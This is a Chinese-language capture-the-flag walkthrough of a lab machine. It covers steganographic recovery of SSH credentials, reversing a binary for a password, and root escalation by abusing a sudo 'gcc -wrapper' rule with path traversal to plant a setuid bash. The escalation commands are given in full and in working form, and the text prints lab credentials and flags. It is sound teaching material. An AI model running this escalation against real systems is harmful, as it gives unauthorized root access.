# 一、信息收集

## 1.1 主机发现

使用 `arp-scan` 扫描局域网内存活主机：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.238 08:00:27:C9:A7:8E       PCS Systemtechnik GmbH
...
```

确定目标主机 IP 为 `192.168.205.238`。

## 1.2 端口扫描

使用 `nmap` 进行全端口扫描：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.238
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
...
```

发现开放了 **SSH (22)** 和 **HTTP (80)** 端口。

## 1.3 Web 服务探测

访问 Web 服务并查看页面源码：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 192.168.205.238
```

在返回的 Apache2 默认页面中，发现两处关键信息：

- HTML 注释中的 MD5 值：`117db0148dc179a2c2245c5a30e63ab0`
- 页面底部注释：`Some people always don't understand the format of photos.`

**知识点补充**：在渗透测试中，HTML 注释、响应头、隐藏字段等位置经常会留下敏感信息或线索，应养成仔细检查的习惯。

# 二、隐写分析

## 2.1 图片文件探测

根据注释提示，尝试不同图片格式访问该 MD5 路径：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -s http://192.168.205.238/117db0148dc179a2c2245c5a30e63ab0 | wc -c
11618

┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -s http://192.168.205.238/117db0148dc179a2c2245c5a30e63ab0.png | wc -c
379011

┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -s http://192.168.205.238/117db0148dc179a2c2245c5a30e63ab0.jpg | wc -c
190696
```

通过文件大小差异，确认存在 `.png` 和 `.jpg` 两个图片文件，下载进行分析。

## 2.2 图片元数据提取

使用 `exiftool` 提取图片元数据：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ exiftool *
======== 117db0148dc179a2c2245c5a30e63ab0.jpg
...
Comment: 219f26695ac66c93de9de70eebeefea4deb071df71b9b7d7ebcc06eca47ff6e4
...
```

在 JPG 文件的 `Comment` 字段中发现一串哈希值。

**知识点补充**：`exiftool` 是分析图片隐写的重要工具，可以提取 EXIF、IPTC、XMP 等多种元数据格式。

## 2.3 LSB 隐写检测

使用 `zsteg` 对 PNG 文件进行 LSB 隐写分析：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ zsteg *
...
[.] 117db0148dc179a2c2245c5a30e63ab0.png
b1,rgb,lsb,xy       .. text: "morainelake"
...
```

在 RGB 通道的 LSB 中发现隐藏字符串：`morainelake`。

**知识点补充**：LSB (Least Significant Bit) 隐写是一种常见的图片隐写技术，通过修改像素值的最低有效位来隐藏数据，`zsteg` 可以自动检测多种 LSB 隐写模式。

## 2.4 Steghide 提取

使用提取到的密码 `morainelake` 解密 JPG 文件：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ steghide --extract -sf 117db0148dc179a2c2245c5a30e63ab0.jpg -p "morainelake"
wrote extracted data to "secret.zip".
```

成功提取出加密的 ZIP 压缩包。

**知识点补充**：`steghide` 支持对 JPEG、BMP、WAV、AU 格式文件进行隐写，使用 AES 加密算法保护嵌入数据。

## 2.5 ZIP 密码破解

使用 `zip2john` 提取哈希后，尝试 `john` 爆破：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ zip2john secret.zip > hash

┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
...
0g 0:00:00:00 DONE
```

使用常规字典未能破解，尝试密码复用成功解压：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ unzip secret.zip
Archive:  secret.zip
[secret.zip] secret/secret.txt password: morainelake
extracting: secret/secret.txt

┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat secret/secret.txt
morainelake:660930334
```

获得 SSH 凭证：`morainelake:660930334`。

# 三、SSH 登录与初步探测

## 3.1 SSH 连接

使用获取的凭证登录目标系统：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ssh morainelake@192.168.205.238
morainelake@192.168.205.238's password: 
...
$ id
uid=1002(morainelake) gid=1002(morainelake) groups=1002(morainelake)
```

成功获取 `morainelake` 用户的 Shell。

## 3.2 信息收集

查看用户家目录：

```bash
$ ls -al
...
-rw-r--r-- 1 root        root        4095 Oct  1 08:29 history
-rw-r--r-- 1 root        root         543 Feb 20  2025 note.txt
...
```

读取提示文件：

```bash
$ cat note.txt
morainelake is a very careless user with a very bad memory. He always throws things aside after organizing them. This time he accidentally lost the flag. Fortunately, the administrator has the historical records, but there are too many records to find the corresponding correct flag. Can you find it correctly?
...
```

提示 flag 在历史记录中，但存在大量干扰项。

## 3.3 提取 User Flag

从 `history` 文件中过滤 flag：

```bash
$ grep -i "flag" history
flag{f1ab46839868f376d90b3064b13aaeab}
flag{ae474208d0e99cae29efdf25d7003c15}
...
（共约 88 个 flag）
```

**注**：需要通过提交验证找出正确的 User Flag（建议使用 Burp Suite Intruder 批量测试）。

# 四、权限提升

## 4.1 系统信息收集

检查 SUID 文件、sudo 权限、网络监听等：

```bash
$ find / -perm -4000 -type f 2>/dev/null
...
-rwsr-xr-x 1 root root 157192 Jan 21  2024 /usr/bin/sudo

$ sudo -l
Sorry, user morainelake may not run sudo on reversteg.

$ ss -tulnp
...
tcp LISTEN 0 80 127.0.0.1:3306 0.0.0.0:*
...
```

发现 `/opt` 目录下有可疑程序：

```bash
$ ls -al /opt
...
-rwxr-xr-x  1 root root 17088 Feb 12  2025 reverse
```

## 4.2 逆向分析

将可执行文件传输到本地进行逆向分析：

```bash
morainelake@reversteg:/opt$ scp reverse kali@192.168.205.128:/mnt/hgfs/gx/x/tmp
```

使用 IDA Pro 分析，关键代码逻辑如下：

1. 程序通过 XOR 和凯撒密码解密多个字符串
2. 将解密后的字符串作为密码验证
3. 最终输出 `flower` 作为提示

编写 Python 脚本解密：

```python
def xor_decrypt(data, key):
    if isinstance(data, str):
        data = data.encode()
    return bytes([b ^ key for b in data]).decode()

def caesar_decrypt(text, shift):
    result = ""
    for char in text:
        if 'a' <= char <= 'z':
            result += chr((ord(char) - ord('a') - shift) % 26 + ord('a'))
        elif 'A' <= char <= 'Z':
            result += chr((ord(char) - ord('A') - shift) % 26 + ord('A'))
        else:
            result += char
    return result

v7 = 8203321
v6 = "/, 8:("
v5_7 = "!!|}yx{z"
v5 = "(;$)(#"
v19 = 77

v7_bytes = v7.to_bytes(4, 'little').rstrip(b'\x00')
print(f"v18: {xor_decrypt(v5_7, v19)}")      # ll104567
print(f"v17: {xor_decrypt(v6, v19)}")        # bamuwe
print(f"v16: {xor_decrypt(v7_bytes, v19)}")  # ta0
print(f"v15: {xor_decrypt(v5, v19)}")        # eviden
print(f"Final: {caesar_decrypt('pvygob', 10)}")  # flower
```

**知识点补充**：凯撒密码是一种替换式密码，通过固定偏移量移动字母位置。XOR 加密具有对称性，即 `A XOR K = B` 时，`B XOR K = A`。

## 4.3 横向移动

尝试切换到 `welcome` 用户，组合解密的字符串作为密码：

```bash
$ su welcome
Password: ll104567bamuweta0eviden
$ bash
welcome@reversteg:/home$ id
uid=1001(welcome) gid=1001(welcome) groups=1001(welcome)
```

## 4.4 Sudo 提权分析

检查 `welcome` 用户的 sudo 权限：

```bash
welcome@reversteg:/home$ sudo -l
Matching Defaults entries for welcome on reversteg:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User welcome may run the following commands on reversteg:
    (ALL : ALL) NOPASSWD: /usr/bin/gcc -wrapper /opt/*
```

发现 `welcome` 用户可以无密码执行 `gcc -wrapper /opt/*` 命令。

**知识点补充**：`gcc` 的 `-wrapper` 参数允许指定一个包装程序，在编译过程中会先执行该包装程序。这个特性可以被利用来执行任意命令。

## 4.5 GCC Wrapper 提权利用

### 漏洞原理

`gcc -wrapper` 参数的设计初衷是为了在编译前后执行额外的处理程序，但当结合 sudo 权限和路径遍历时，可以突破 `/opt/*` 的限制：

1. 使用 `..` 进行路径遍历，指向 `/tmp` 等可写目录
2. 创建恶意脚本，利用 root 权限执行任意命令
3. 通过 SUID 二进制文件维持权限

### 利用步骤

创建提权脚本：

```bash
welcome@reversteg:/home$ cat > /tmp/a.sh << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF
```

赋予执行权限：

```bash
welcome@reversteg:/home$ chmod +x /tmp/a.sh
```

创建一个虚拟的 C 源文件（gcc 需要编译目标）：

```bash
welcome@reversteg:/home$ echo 'int main(){return 0;}' > /tmp/dummy.c
```

**关键利用命令**：

```bash
welcome@reversteg:/home$ sudo /usr/bin/gcc -wrapper /opt/../tmp/a.sh,--version /tmp/dummy.c
```

**命令解析**：

- `/opt/../tmp/a.sh`：通过路径遍历绕过 `/opt/*` 限制
- `,--version`：`,` 作为分隔符，后续参数传递给 gcc
- 执行时会先以 root 权限运行 `/tmp/a.sh`

验证 SUID 二进制文件是否创建成功：

```bash
welcome@reversteg:/home$ ls -la /tmp/rootbash
-rwsr-sr-x 1 root root 1168776 Oct  1 08:42 /tmp/rootbash
```

**知识点补充**：

- **SUID (Set User ID)**：当可执行文件设置了 SUID 位时，执行该文件的用户会临时获得文件所有者的权限
- **-p 参数**：bash 的 `-p` 参数会保持有效用户 ID (effective UID)，防止 bash 自动降低权限

## 4.6 获取 Root Shell

使用创建的 SUID bash 获取 root 权限：

```bash
welcome@reversteg:/home$ /tmp/rootbash -p
rootbash-5.0# id
uid=1001(welcome) gid=1001(welcome) euid=0(root) egid=0(root) groups=0(root),1001(welcome)
```

成功获取 root 权限（euid=0）。

**知识点补充**：

- **uid vs euid**：uid 是实际用户 ID，euid 是有效用户 ID。系统权限检查基于 euid
- 这种方式获取的权限中，uid 仍是普通用户，但 euid 为 root，足以执行特权操作

# 五、获取 Root Flag

读取 root 目录下的 flag：

```bash
rootbash-5.0# cat /root/root.txt
flag{4f1eab505b71cd930b0eccd83ff0cfef}
```

成功获取 Root Flag：`flag{4f1eab505b71cd930b0eccd83ff0cfef}`